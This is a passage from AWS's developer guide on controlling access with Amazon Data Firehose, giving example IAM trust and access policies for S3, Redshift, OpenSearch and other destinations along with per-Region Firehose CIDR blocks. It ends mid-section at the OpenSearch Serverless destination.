=== Content from docs.aws.amazon.com_11c4804b_20250111_082351.html ===
Controlling access with Amazon Data Firehose - Amazon Data Firehose[AWS](https://aws.amazon.com)[Documentation](/index.html)[Amazon Data Firehose](/firehose/index.html)[Developer Guide](what-is-this-service.html)[Grant access to your Firehose resources](#access-to-firehose)[Grant Firehose access to your private Amazon MSK cluster](#access-to-msk)[Allow Firehose to assume an IAM role](#firehose-assume-role)[Grant Firehose access to AWS Glue for data format
conversion](#using-iam-glue)[Grant Firehose access to an Amazon S3 destination](#using-iam-s3)[Grant Firehose access to Amazon S3 Tables](#using-s3-tables)[Grant Firehose access to an Apache Iceberg Tables
destination](#using-iam-iceberg)[Grant Firehose access to an Amazon Redshift destination](#using-iam-rs) [Grant Firehose access to a public OpenSearch Service destination](#using-iam-es)[Grant Firehose access to an OpenSearch Service destination in a
VPC](#using-iam-es-vpc)[Grant Firehose access to a public OpenSearch
Serverless destination](#using-iam-serverless)[Grant Firehose access to an OpenSearch
Serverless destination in a VPC](#using-iam-serverless-vpc)[Grant Firehose access to a Splunk destination](#using-iam-splunk)[Accessing Splunk in VPC](#using-iam-splunk-vpc)[Tutorial: Ingest VPC flow logs into Splunk using Amazon Data Firehose](#vpc-splunk-tutorial)[Accessing Snowflake or HTTP end
point](#using-snowflake-http-endpoint)[Grant Firehose access to a Snowflake
destination](#using-iam-snowflake)[Accessing Snowflake in VPC](#using-iam-snowflake-vpc)[Grant Firehose access to an HTTP endpoint
destination](#using-iam-http)[Cross-account delivery from Amazon MSK](#cross-account-delivery-msk)[Cross-account delivery to an Amazon S3
destination](#cross-account-delivery-s3)[Cross-account delivery to an OpenSearch Service
destination](#cross-account-delivery-es)[Using tags to control access](#tag-based-access-control)
# Controlling access with Amazon Data Firehose

The following sections cover how to control access to and from your Amazon Data Firehose resources. The
information they cover includes how to grant your application access so it can send data to
your Firehose stream. They also describe how you can grant Amazon Data Firehose access to your
Amazon Simple Storage Service (Amazon S3) bucket, Amazon Redshift cluster, or Amazon OpenSearch Service cluster, as well as the
access permissions you need if you use Datadog, Dynatrace, LogicMonitor, MongoDB, New Relic,
Splunk, or Sumo Logic as your destination. Finally, you'll find in this topic guidance on
how to configure Amazon Data Firehose so it can deliver data to a destination that belongs to a different
AWS account. The technology for managing all these forms of access is AWS Identity and Access Management (IAM).
For more information about IAM, see [What
is IAM?](https://docs.aws.amazon.com/IAM/latest/UserGuide/IAM_Introduction.html).

###### Contents

* [Grant access to your Firehose resources](#access-to-firehose)
* [Grant Firehose access to your private Amazon MSK cluster](#access-to-msk)
* [Allow Firehose to assume an IAM role](#firehose-assume-role)
* [Grant Firehose access to AWS Glue for data format
  conversion](#using-iam-glue)
* [Grant Firehose access to an Amazon S3 destination](#using-iam-s3)
* [Grant Firehose access to Amazon S3 Tables](#using-s3-tables)
* [Grant Firehose access to an Apache Iceberg Tables
  destination](#using-iam-iceberg)
* [Grant Firehose access to an Amazon Redshift destination](#using-iam-rs)
* [Grant Firehose access to a public OpenSearch Service destination](#using-iam-es)
* [Grant Firehose access to an OpenSearch Service destination in a
  VPC](#using-iam-es-vpc)
* [Grant Firehose access to a public OpenSearch
  Serverless destination](#using-iam-serverless)
* [Grant Firehose access to an OpenSearch
  Serverless destination in a VPC](#using-iam-serverless-vpc)
* [Grant Firehose access to a Splunk destination](#using-iam-splunk)
* [Accessing Splunk in VPC](#using-iam-splunk-vpc)
* [Ingest VPC flow logs into Splunk using Amazon Data Firehose](#vpc-splunk-tutorial)
* [Accessing Snowflake or HTTP end
  point](#using-snowflake-http-endpoint)
* [Grant Firehose access to a Snowflake
  destination](#using-iam-snowflake)
* [Accessing Snowflake in VPC](#using-iam-snowflake-vpc)
* [Grant Firehose access to an HTTP endpoint
  destination](#using-iam-http)
* [Cross-account delivery from Amazon MSK](#cross-account-delivery-msk)
* [Cross-account delivery to an Amazon S3
  destination](#cross-account-delivery-s3)
* [Cross-account delivery to an OpenSearch Service
  destination](#cross-account-delivery-es)
* [Using tags to control access](#tag-based-access-control)
## Grant access to your Firehose resources

To give your application access to your Firehose stream, use a policy similar to
this example. You can adjust the individual API operations to which you grant access by
modifying the `Action` section, or grant access to all operations with
`"firehose:*"`.

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "firehose:DeleteDeliveryStream",
                "firehose:PutRecord",
                "firehose:PutRecordBatch",
                "firehose:UpdateDestination"
            ],
            "Resource": [
                "arn:aws:firehose:region:account-id:deliverystream/delivery-stream-name"
            ]
        }
    ]
}
```
## Grant Firehose access to your private Amazon MSK cluster

If the source of your Firehose stream is a private Amazon MSK cluster, then use a policy similar
to this example.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Principal": {
        "Service": [
          "firehose.amazonaws.com"
        ]
    },
    "Effect": "Allow",
    "Action": [
      "kafka:CreateVpcConnection"
    ],
    "Resource": "cluster-arn"
    }
  ]
}
```

You must add a policy like this to the cluster's resource-based policy to grant Firehose
service principal the permission to invoke the Amazon MSK `CreateVpcConnection`
API operation.

## Allow Firehose to assume an IAM role

This section describes the permissions and policies that grant Amazon Data Firehose
access to ingest, process, and deliver data from source to destination.

###### Note

If you use the console to create a Firehose stream and choose the option to create
a new role, AWS attaches the required trust policy to the role. If you want Amazon Data Firehose
to use an existing IAM role or if you create a role on your own, attach the
following trust policies to that role so that Amazon Data Firehose can assume it. Edit the policies
to replace `account-id` with your AWS account ID. For
information about how to modify the trust relationship of a role, see [Modifying a Role](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_manage_modify.html).

Amazon Data Firehose uses an IAM role for all the permissions that the Firehose stream needs to
process and deliver data. Make sure that the following trust policies are attached to
that role so that Amazon Data Firehose can assume it.

```
{
	"Version": "2012-10-17",
	"Statement": [{
		"Sid": "",
		"Effect": "Allow",
		"Principal": {
			"Service": "firehose.amazonaws.com"
		},
		"Action": "sts:AssumeRole",
		"Condition": {
			"StringEquals": {
				"sts:ExternalId": "account-id"
			}
		}
	}]
}
```

This policy uses the `sts:ExternalId` condition context key to ensure that
only Amazon Data Firehose activity originating from your AWS account can assume this IAM role. For
more information about preventing unauthorized use of IAM roles, see [The confused deputy
problem](https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html) in the *IAM User Guide*.

If you choose Amazon MSK as the source for your Firehose stream, you must specify
another IAM role that grants Amazon Data Firehose permissions to ingest source data
from the specified Amazon MSK cluster. Make sure that the following trust policies
are attached to that role so that Amazon Data Firehose can assume it.

```

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Principal": {
        "Service": [
          "firehose.amazonaws.com"
        ]
      },
      "Effect": "Allow",
      "Action": "sts:AssumeRole"
    }
  ]
}

```

Make sure that this role that grants Amazon Data Firehose permissions to ingest source data
from the specified Amazon MSK cluster grants the following permissions:

```

{
   "Version": "2012-10-17",
   "Statement": [{
        "Effect":"Allow",
        "Action": [
           "kafka:GetBootstrapBrokers",
           "kafka:DescribeCluster",
           "kafka:DescribeClusterV2",
           "kafka-cluster:Connect"
         ],
         "Resource": "CLUSTER-ARN"
       },
       {
         "Effect":"Allow",
         "Action": [
           "kafka-cluster:DescribeTopic",
           "kafka-cluster:DescribeTopicDynamicConfiguration",
           "kafka-cluster:ReadData"
         ],
         "Resource": "TOPIC-ARN"
       }]
}

```
## Grant Firehose access to AWS Glue for data format conversion

If your Firehose stream performs data-format conversion, Amazon Data Firehose references table
definitions stored in AWS Glue. To give Amazon Data Firehose the necessary access to AWS Glue, add the
following statement to your policy. For information on how to find the ARN of the table,
see [Specifying AWS Glue Resource ARNs](https://docs.aws.amazon.com/glue/latest/dg/glue-specifying-resource-arns.html).

```
[{
    "Effect": "Allow",
    "Action": [
        "glue:GetTable",
        "glue:GetTableVersion",
        "glue:GetTableVersions"
    ],
    "Resource": "table-arn"
}, {
    "Sid": "GetSchemaVersion",
    "Effect": "Allow",
    "Action": [
        "glue:GetSchemaVersion"
    ],
    "Resource": ["*"]
}]
```

The recommended policy for getting schemas from schema registry has no resource restrictions. For more information, see [IAM examples for deserializers](https://docs.aws.amazon.com/glue/latest/dg/schema-registry-gs.html#schema-registry-gs1b) in the AWS Glue Developer Guide.

## Grant Firehose access to an Amazon S3 destination

When you're using an Amazon S3 destination, Amazon Data Firehose delivers data to your S3 bucket and can
optionally use an AWS KMS key that you own for data encryption. If error logging is
enabled, Amazon Data Firehose also sends data delivery errors to your CloudWatch log group and streams. You
are required to have an IAM role when creating a Firehose stream. Amazon Data Firehose assumes that
IAM role and gains access to the specified bucket, key, and CloudWatch log group and
streams.

Use the following access policy to enable Amazon Data Firehose to access your S3 bucket and AWS KMS
key. If you don't own the S3 bucket, add `s3:PutObjectAcl` to the list of
Amazon S3 actions. This grants the bucket owner full access to the objects delivered by
Amazon Data Firehose.

```
{
    "Version": "2012-10-17",
    "Statement":
    [
        {
            "Effect": "Allow",
            "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::amzn-s3-demo-bucket",
                "arn:aws:s3:::amzn-s3-demo-bucket/*"
            ]
        },
        {
            "Effect": "Allow",
            "Action": [
                "kinesis:DescribeStream",
                "kinesis:GetShardIterator",
                "kinesis:GetRecords",
                "kinesis:ListShards"
            ],
            "Resource": "arn:aws:kinesis:region:account-id:stream/stream-name"
        },
        {
           "Effect": "Allow",
           "Action": [
               "kms:Decrypt",
               "kms:GenerateDataKey"
           ],
           "Resource": [
               "arn:aws:kms:region:account-id:key/key-id"
           ],
           "Condition": {
               "StringEquals": {
                   "kms:ViaService": "s3.region.amazonaws.com"
               },
               "StringLike": {
                   "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
               }
           }
        },
        {
           "Effect": "Allow",
           "Action": [
               "logs:PutLogEvents"
           ],
           "Resource": [
               "arn:aws:logs:region:account-id:log-group:log-group-name:log-stream:log-stream-name"
           ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "lambda:InvokeFunction",
               "lambda:GetFunctionConfiguration"
           ],
           "Resource": [
               "arn:aws:lambda:region:account-id:function:function-name:function-version"
           ]
        }
    ]
}
```

The policy above also has a statement that allows access to Amazon Kinesis Data Streams. If you don't
use Kinesis Data Streams as your data source, you can remove that statement. If you use Amazon MSK as
your source, then you can substitute that statement with the following:

```
{
   "Sid":"",
   "Effect":"Allow",
   "Action":[
      "kafka:GetBootstrapBrokers",
      "kafka:DescribeCluster",
      "kafka:DescribeClusterV2",
      "kafka-cluster:Connect"
   ],
   "Resource":"arn:aws:kafka:{{mskClusterRegion}}:{{mskClusterAccount}}:cluster/{{mskClusterName}}/{{clusterUUID}}"
},
{
   "Sid":"",
   "Effect":"Allow",
   "Action":[
      "kafka-cluster:DescribeTopic",
      "kafka-cluster:DescribeTopicDynamicConfiguration",
      "kafka-cluster:ReadData"
   ],
   "Resource":"arn:aws:kafka:{{mskClusterRegion}}:{{mskClusterAccount}}:topic/{{mskClusterName}}/{{clusterUUID}}/{{mskTopicName}}"
},
{
   "Sid":"",
   "Effect":"Allow",
   "Action":[
      "kafka-cluster:DescribeGroup"
   ],
   "Resource":"arn:aws:kafka:{{mskClusterRegion}}:{{mskClusterAccount}}:group/{{mskClusterName}}/{{clusterUUID}}/*"
}
```

For more information about allowing other AWS services to access your AWS
resources, see [Creating a
Role to Delegate Permissions to an AWS Service](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-service.html) in the
*IAM User Guide*.

To learn how to grant Amazon Data Firehose access to an Amazon S3 destination in another account, see
[Cross-account delivery to an Amazon S3
destination](#cross-account-delivery-s3).

## Grant Firehose access to Amazon S3 Tables

You must have an IAM role before you create a Firehose stream. Use the following steps
to create a policy and an IAM role. Firehose assumes this IAM role and performs the
required actions.

Sign in to the AWS Management Console and open the IAM console at <https://console.aws.amazon.com/iam/>.

Create a policy and choose **JSON** in the policy editor. Add the
following inline policy that grants Amazon S3 permissions such as read/write permissions,
permissions to update the table in the data catalog, and others.

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "S3TableAccessViaGlueFederation",
      "Effect": "Allow",
      "Action": [
        "glue:GetTable",
        "glue:GetDatabase",
        "glue:UpdateTable"
      ],
      "Resource": [
        "arn:aws:glue:<region>:<account-id>:catalog/s3tablescatalog/*",
        "arn:aws:glue:<region>:<account-id>:catalog/s3tablescatalog",
        "arn:aws:glue:<region>:<account-id>:catalog",
        "arn:aws:glue:<region>:<account-id>:database/*",
        "arn:aws:glue:<region>:<account-id>:table/*/*"
      ]
    },
    {
      "Sid": "S3DeliveryErrorBucketPermission",
      "Effect": "Allow",
      "Action": [
        "s3:AbortMultipartUpload",
        "s3:GetBucketLocation",
        "s3:GetObject",
        "s3:ListBucket",
        "s3:ListBucketMultipartUploads",
        "s3:PutObject"
      ],
      "Resource": [
        "arn:aws:s3:::<error delivery bucket>",
        "arn:aws:s3:::<error delivery bucket>/*"
      ]
    },
    {
      "Sid": "RequiredWhenUsingKinesisDataStreamsAsSource",
      "Effect": "Allow",
      "Action": [
        "kinesis:DescribeStream",
        "kinesis:GetShardIterator",
        "kinesis:GetRecords",
        "kinesis:ListShards"
      ],
      "Resource": "arn:aws:kinesis:<region>:<account-id>:stream/<stream-name>"
    },
    {
      "Sid": "RequiredWhenDoingMetadataReadsANDDataAndMetadataWriteViaLakeformation",
      "Effect": "Allow",
      "Action": [
        "lakeformation:GetDataAccess"
      ],
      "Resource": "*"
    },
    {
      "Sid": "RequiredWhenUsingKMSEncryptionForS3ErrorBucketDelivery",
      "Effect": "Allow",
      "Action": [
        "kms:Decrypt",
        "kms:GenerateDataKey"
      ],
      "Resource": [
        "arn:aws:kms:<region>:<account-id>:key/<KMS-key-id>"
      ],
      "Condition": {
        "StringEquals": {
          "kms:ViaService": "s3.<region>.amazonaws.com"
        },
        "StringLike": {
          "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::<error delivery bucket>/prefix*"
        }
      }
    },
    {
      "Sid": "LoggingInCloudWatch",
      "Effect": "Allow",
      "Action": [
        "logs:PutLogEvents"
      ],
      "Resource": [
        "arn:aws:logs:<region>:<account-id>:log-group:<log-group-name>:log-stream:<log-stream-name>"
      ]
    },
    {
      "Sid": "RequiredWhenAttachingLambdaToFirehose",
      "Effect": "Allow",
      "Action": [
        "lambda:InvokeFunction",
        "lambda:GetFunctionConfiguration"
      ],
      "Resource": [
        "arn:aws:lambda:<region>:<account-id>:function:<function-name>:<function-version>"
      ]
    }
  ]
}
```

The policy has statements that allows access to Amazon Kinesis Data Streams, invoking Lambda functions,
and access to AWS KMS keys. If you don't use any of these resources, you can remove the
respective statements. If error logging is enabled, Amazon Data Firehose also sends data delivery
errors to your CloudWatch log group and streams. You must configure log group and log stream
names to use this option. For log group and log stream names, see (Monitor Amazon Data
Firehose Using CloudWatch Logs.)(need link).

In the inline policies, replace `<error delivery bucket>` with your Amazon S3
bucket name, `aws-account-id` and Region with a valid AWS account number
and Region of the resource.

After you create the policy, open the IAM console at <https://console.aws.amazon.com/iam/> and create
an IAM role with **AWS service** as the **Trusted entity
type**.

For **Service or use case**, choose **Kinesis**. For
**Use case** , choose **Kinesis Firehose**.

On the next page, choose the policy created in the previous step to attach to this
role. On the review page, you will find trust policy already attached to this role
giving permissions to the Firehose service to assume this role. When you create the role,
Amazon Data Firehose can assume it to perform required operations on AWS Glue and S3 buckets. Add the
Firehose service principal to the trust policy of the role that is created. For more
information, see [Allow Firehose to assume an IAM role](https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#firehose-assume-role).

## Grant Firehose access to an Apache Iceberg Tables destination

You must have an IAM role before you create a Firehose stream and Apache Iceberg Tables
using AWS Glue. Use the following steps to create a policy and an IAM role. Firehose assumes
this IAM role and performs the required actions.

1. Sign in to the AWS Management Console and open the IAM console at <https://console.aws.amazon.com/iam/>.
2. Create a policy and choose **JSON** in policy editor.
3. Add the following inline policy that grants Amazon S3 permissions like the
   read/write permissions, permissions to update the table in the data catalog etc.

   ```
   {
       "Version": "2012-10-17",
       "Statement":
       [
           {
               "Effect": "Allow",
               "Action": [
                   "glue:GetTable",
                   "glue:GetDatabase",
                   "glue:UpdateTable"
               ],
               "Resource": [
                   "arn:aws:glue:<region>:<aws-account-id>:catalog",
                   "arn:aws:glue:<region>:<aws-account-id>:database/*",
                   "arn:aws:glue:<region>:<aws-account-id>:table/*/*"
               ]
           },
           {
               "Effect": "Allow",
               "Action": [
                   "s3:AbortMultipartUpload",
                   "s3:GetBucketLocation",
                   "s3:GetObject",
                   "s3:ListBucket",
                   "s3:ListBucketMultipartUploads",
                   "s3:PutObject",
                   "s3:DeleteObject"
               ],
               "Resource": [
                   "arn:aws:s3:::amzn-s3-demo-bucket",
                   "arn:aws:s3:::amzn-s3-demo-bucket/*"
               ]
           },
           {
               "Effect": "Allow",
               "Action": [
                   "kinesis:DescribeStream",
                   "kinesis:GetShardIterator",
                   "kinesis:GetRecords",
                   "kinesis:ListShards"
               ],
               "Resource": "arn:aws:kinesis:<region>:<aws-account-id>:stream/<stream-name>"
           },
           {
              "Effect": "Allow",
              "Action": [
                  "kms:Decrypt",
                  "kms:GenerateDataKey"
              ],
              "Resource": [
                  "arn:aws:kms:<region>:<aws-account-id>:key/<key-id>"
              ],
              "Condition": {
                  "StringEquals": {
                      "kms:ViaService": "s3.region.amazonaws.com"
                  },
                  "StringLike": {
                      "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
                  }
              }
           },
           {
              "Effect": "Allow",
              "Action": [
                  "logs:PutLogEvents"
              ],
              "Resource": [
                  "arn:aws:logs:<region>:<aws-account-id>:log-group:<log-group-name>:log-stream:<log-stream-name>"
              ]
           },
           {
              "Effect": "Allow",
              "Action": [
                  "lambda:InvokeFunction",
                  "lambda:GetFunctionConfiguration"
              ],
              "Resource": [
                  "arn:aws:lambda:<region>:<aws-account-id>:function:<function-name>:<function-version>"
              ]
           }
       ]
   }
   ```

   This policy has a statement that allows access to Amazon Kinesis Data Streams, invoking Lambda
   functions, and access to KMS keys. If you don't use any of these resources,
   you can remove the respective statements.

   If error logging is enabled, Firehose also sends data delivery errors to your
   CloudWatch log group and streams. For this you must configure log group and log stream
   names. For log group and log stream names, see [Monitor Amazon Data Firehose Using
   CloudWatch Logs](./monitoring-with-cloudwatch-logs.html).
4. In the inline policies, replace `amzn-s3-demo-bucket`
   with your Amazon S3 bucket name, aws-account-id and Region with a valid AWS account
   number and Region of the resources.

   ###### Note

   This role gives permission to all databases and tables in your data
   catalog. If you want, you can give permissions only to specific tables and
   databases.
5. After you create the policy, open the [IAM console](https://console.aws.amazon.com/iam/) and create an
   IAM role with **AWS service** as the **Trusted entity
   type**.
6. For **Service or use case**, choose
   **Kinesis**. For **Use case** choose
   **Kinesis Firehose**.
7. On the next page, choose the policy created in the previous step to attach to
   this role. On the review page, you will find trust policy already attached to
   this role giving permissions to Firehose service to assume this role. When you
   create the role, Amazon Data Firehose can assume it to perform required operations on AWS Glue
   and S3 buckets.
## Grant Firehose access to an Amazon Redshift destination

Refer to the following when you are granting access to Amazon Data Firehose when using an Amazon Redshift
destination.

###### Topics

* [IAM role and access policy](#using-iam-rs-policy)
* [VPC access to an Amazon Redshift provisioned cluster or
  Amazon Redshift Serverless workgroup](#using-iam-rs-vpc)
### IAM role and access policy

When you're using an Amazon Redshift destination, Amazon Data Firehose delivers data to your S3 bucket
as an intermediate location. It can optionally use an AWS KMS key you own for data
encryption. Amazon Data Firehose then loads the data from the S3 bucket to your Amazon Redshift
provisioned cluster or Amazon Redshift Serverless workgroup. If error logging is enabled, Amazon Data Firehose
also sends data delivery errors to your CloudWatch log group and streams. Amazon Data Firehose uses the
specified Amazon Redshift user name and password to access your provisioned cluster or Amazon Redshift
Serverless workgroup, and uses an IAM role to access the specified bucket, key,
CloudWatch log group, and streams. You are required to have an IAM role when creating a
Firehose stream.

Use the following access policy to enable Amazon Data Firehose to access your S3 bucket and AWS KMS
key. If you don't own the S3 bucket, add `s3:PutObjectAcl` to the list of
Amazon S3 actions, which grants the bucket owner full access to the objects delivered by
Amazon Data Firehose. This policy also has a statement that allows access to Amazon Kinesis Data Streams. If you
don't use Kinesis Data Streams as your data source, you can remove that statement.

```
{
"Version": "2012-10-17",
    "Statement":
    [
        {
            "Effect": "Allow",
            "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::amzn-s3-demo-bucket",
                "arn:aws:s3:::amzn-s3-demo-bucket/*"
            ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "kms:Decrypt",
               "kms:GenerateDataKey"
           ],
           "Resource": [
               "arn:aws:kms:region:account-id:key/key-id"
           ],
           "Condition": {
               "StringEquals": {
                   "kms:ViaService": "s3.region.amazonaws.com"
               },
               "StringLike": {
                   "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
               }
           }
        },
        {
           "Effect": "Allow",
           "Action": [
               "kinesis:DescribeStream",
               "kinesis:GetShardIterator",
               "kinesis:GetRecords",
               "kinesis:ListShards"
           ],
           "Resource": "arn:aws:kinesis:region:account-id:stream/stream-name"
        },
        {
           "Effect": "Allow",
           "Action": [
               "logs:PutLogEvents"
           ],
           "Resource": [
               "arn:aws:logs:region:account-id:log-group:log-group-name:log-stream:log-stream-name"
           ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "lambda:InvokeFunction",
               "lambda:GetFunctionConfiguration"
           ],
           "Resource": [
               "arn:aws:lambda:region:account-id:function:function-name:function-version"
           ]
        }
    ]
}
```

For more information about allowing other AWS services to access your AWS
resources, see [Creating
a Role to Delegate Permissions to an AWS Service](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-service.html) in the
*IAM User Guide*.

### VPC access to an Amazon Redshift provisioned cluster or Amazon Redshift Serverless workgroup

If your Amazon Redshift provisioned cluster or Amazon Redshift Serverless workgroup is in a virtual private
cloud (VPC), it must be publicly accessible with a public IP address. Also, grant
Amazon Data Firehose access to your Amazon Redshift provisioned cluster or Amazon Redshift Serverless workgroup by
unblocking the Amazon Data Firehose IP addresses. Amazon Data Firehose currently uses one CIDR block for
each available Region.

| Region | CIDR blocks |
| --- | --- |
| US East (Ohio) | `13.58.135.96/27` |
| US East (N. Virginia) | `52.70.63.192/27` |
| US West (N. California) | `13.57.135.192/27` |
| US West (Oregon) | `52.89.255.224/27` |
| AWS GovCloud (US-East) | `18.253.138.96/27` |
| AWS GovCloud (US-West) | `52.61.204.160/27` |
| Canada (Central) | `35.183.92.128/27` |
| Canada West (Calgary) | `40.176.98.192/27` |
| Asia Pacific (Hong Kong) | `18.162.221.32/27` |
| Asia Pacific (Mumbai) | `13.232.67.32/27` |
| Asia Pacific (Hyderabad) | `18.60.192.128/27` |
| Asia Pacific (Seoul) | `13.209.1.64/27` |
| Asia Pacific (Singapore) | `13.228.64.192/27` |
| Asia Pacific (Sydney) | `13.210.67.224/27` |
| Asia Pacific (Jakarta) | `108.136.221.64/27` |
| Asia Pacific (Tokyo) | `13.113.196.224/27` |
| Asia Pacific (Osaka) | `13.208.177.192/27` |
| China (Beijing) | `52.81.151.32/27` |
| China (Ningxia) | `161.189.23.64/27` |
| Europe (Zurich) | `16.62.183.32/27` |
| Europe (Frankfurt) | `35.158.127.160/27` |
| Europe (Ireland) | `52.19.239.192/27` |
| Europe (London) | `18.130.1.96/27` |
| Europe (Paris) | `35.180.1.96/27` |
| Europe (Stockholm) | `13.53.63.224/27` |
| Middle East (Bahrain) | `15.185.91.0/27` |
| South America (SÃ£o Paulo) | `18.228.1.128/27` |
| Europe (Milan) | `15.161.135.128/27` |
| Africa (Cape Town) | `13.244.121.224/27` |
| Middle East (UAE) | `3.28.159.32/27` |
| Israel (Tel Aviv) | `51.16.102.0/27` |
| Asia Pacific (Melbourne) | `16.50.161.128/27` |
| Asia Pacific (Malaysia) | `43.216.58.0/27` |

For more information about how to unblock IP addresses, see the step [Authorize Access to the
Cluster](https://docs.aws.amazon.com/redshift/latest/gsg/rs-gsg-authorize-cluster-access.html) in the *Amazon Redshift Getting Started Guide* guide.

## Grant Firehose access to a public OpenSearch Service destination

When you're using an OpenSearch Service destination, Amazon Data Firehose delivers data to your
OpenSearch Service cluster, and concurrently backs up failed or all documents to your S3
bucket. If error logging is enabled, Amazon Data Firehose also sends data delivery errors to your CloudWatch
log group and streams. Amazon Data Firehose uses an IAM role to access the specified OpenSearch
Service domain, S3 bucket, AWS KMS key, and CloudWatch log group and streams. You are required
to have an IAM role when creating a Firehose stream.

Use the following access policy to enable Amazon Data Firehose to access your S3 bucket, OpenSearch
Service domain, and AWS KMS key. If you do not own the S3 bucket, add
`s3:PutObjectAcl` to the list of Amazon S3 actions, which grants the bucket
owner full access to the objects delivered by Amazon Data Firehose. This policy also has a statement
that allows access to Amazon Kinesis Data Streams. If you don't use Kinesis Data Streams as your data source, you can
remove that statement.

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
            ],
            "Resource": [
                "arn:aws:s3:::amzn-s3-demo-bucket",
                "arn:aws:s3:::amzn-s3-demo-bucket/*"
            ]
        },
        {
           "Effect": "Allow",
           "Action": [
               "kms:Decrypt",
               "kms:GenerateDataKey"
           ],
           "Resource": [
               "arn:aws:kms:region:account-id:key/key-id"
           ],
           "Condition": {
               "StringEquals": {
                   "kms:ViaService": "s3.region.amazonaws.com"
               },
               "StringLike": {
                   "kms:EncryptionContext:aws:s3:arn": "arn:aws:s3:::amzn-s3-demo-bucket/prefix*"
               }
           }
        },
        {
           "Effect": "Allow",
           "Action": [
               "es:DescribeDomain",
               "es:DescribeDomains",
               "es:DescribeDomainConfig",
               "es:ESHttpPost",
               "es:ESHttpPut"
           ],
          "Resource": [
              "arn:aws:es:region:account-id:domain/domain-name",
              "arn:aws:es:region:account-id:domain/domain-name/*"
          ]
       },
       {
          "Effect": "Allow",
          "Action": [
              "es:ESHttpGet"
          ],
          "Resource": [
              "arn:aws:es:region:account-id:domain/domain-name/_all/_settings",
              "arn:aws:es:region:account-id:domain/domain-name/_cluster/stats",
              "arn:aws:es:region:account-id:domain/domain-name/index-name*/_mapping/type-name",
              "arn:aws:es:region:account-id:domain/domain-name/_nodes",
              "arn:aws:es:region:account-id:domain/domain-name/_nodes/stats",
              "arn:aws:es:region:account-id:domain/domain-name/_nodes/*/stats",
              "arn:aws:es:region:account-id:domain/domain-name/_stats",
              "arn:aws:es:region:account-id:domain/domain-name/index-name*/_stats",
              "arn:aws:es:region:account-id:domain/domain-name/"
          ]
       },
       {
          "Effect": "Allow",
          "Action": [
              "kinesis:DescribeStream",
              "kinesis:GetShardIterator",
              "kinesis:GetRecords",
              "kinesis:ListShards"
          ],
          "Resource": "arn:aws:kinesis:region:account-id:stream/stream-name"
       },
       {
          "Effect": "Allow",
          "Action": [
              "logs:PutLogEvents"
          ],
          "Resource": [
              "arn:aws:logs:region:account-id:log-group:log-group-name:log-stream:log-stream-name"
          ]
       },
       {
          "Effect": "Allow",
          "Action": [
              "lambda:InvokeFunction",
              "lambda:GetFunctionConfiguration"
          ],
          "Resource": [
              "arn:aws:lambda:region:account-id:function:function-name:function-version"
          ]
       }
    ]
}
```

For more information about allowing other AWS services to access your AWS
resources, see [Creating a
Role to Delegate Permissions to an AWS Service](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-service.html) in the
*IAM User Guide*.

To learn how to grant Amazon Data Firehose access to an OpenSearch Service cluster in another
account, see [Cross-account delivery to an OpenSearch Service
destination](#cross-account-delivery-es).

## Grant Firehose access to an OpenSearch Service destination in a VPC

If your OpenSearch Service domain is in a VPC, make sure you give Amazon Data Firehose the
permissions that are described in the previous section. In addition, you need to give
Amazon Data Firehose the following permissions to enable it to access your OpenSearch Service domain's
VPC.

* `ec2:DescribeVpcs`
* `ec2:DescribeVpcAttribute`
* `ec2:DescribeSubnets`
* `ec2:DescribeSecurityGroups`
* `ec2:DescribeNetworkInterfaces`
* `ec2:CreateNetworkInterface`
* `ec2:CreateNetworkInterfacePermission`
* `ec2:DeleteNetworkInterface`

###### Important

Do not revoke these permissions after you create the Firehose stream. If you revoke these
permissions, your Firehose stream will be degraded or stop delivering data to your
OpenSearch service domain whenever the service attempts to query or update
ENIs.

###### Important

When you specify subnets for delivering data to the destination in a private VPC, make sure you have enough number
of free IP addresses in chosen subnets. If there is no available free IP address in a specified subnet, Firehose cannot create or
add ENIs for the data delivery in the private VPC, and the delivery will be degraded or fail.

When you create or update your Firehose stream, you specify a security group for Firehose to
use when it sends data to your OpenSearch Service domain. You can use the same security
group that the OpenSearch Service domain uses or a different one. If you specify a
different security group, ensure that it allows outbound HTTPS traffic to the OpenSearch
Service domain's security group. Also ensure that the OpenSearch Service domain's
security group allows HTTPS traffic from the security group you specified when you
configured your Firehose stream. If you use the same security group for both your Firehose stream
and the OpenSearch Service domain, make sure the security group inbound rule allows
HTTPS traffic. For more information about security group rules, see [Security group rules](https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html#SecurityGroupRules) in the Amazon VPC documentation.

## Grant Firehose access to a public OpenSearch Serverless destination

When you're using an OpenSearch Serverless destination, Amazon Data Firehose delivers data to your
OpenSearch Serverless collection, and concurrently backs up failed or all documents to
